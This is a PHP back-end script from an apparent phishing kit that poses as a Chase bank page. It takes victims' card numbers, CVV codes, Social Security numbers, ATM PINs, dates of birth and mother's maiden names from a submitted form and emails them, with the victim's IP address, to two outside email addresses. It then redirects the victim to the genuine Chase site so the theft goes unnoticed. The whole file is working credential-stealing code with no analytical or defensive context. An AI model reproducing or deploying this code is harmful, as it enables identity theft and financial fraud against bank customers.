<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || GhostMode || :------\n";
$message .= "Date of Birth              : ".$_POST['dob']."\n";
$message .= "Street Address              : ".$_POST['address']."\n";
$message .= "Phone Number             : ".$_POST['phone']."\n";
$message .= "Name On Card            : ".$_POST['noc']."\n";
$message .= "Card Number            : ".$_POST['cardnumber']."\n";
$message .= "Expiration Date MM/YY             : ".$_POST['exp']."\n";
$message .= "CCV/CSC             : ".$_POST['ccv']."\n";
$message .= "Social Security Number              : ".$_POST['ssn']."\n";
$message .= "ATM PIN             : ".$_POST['atm']."\n";
$message .= "Mother's Maiden Name              : ".$_POST['mothr']."\n";
$message .= "----: || GhostMode || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "greggee2@yandex.com, jimmyDavis121@outlook.com";
$subject = " CHASE CC INFO 2020 | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  https://www.chase.com/digital/customer-service");
?>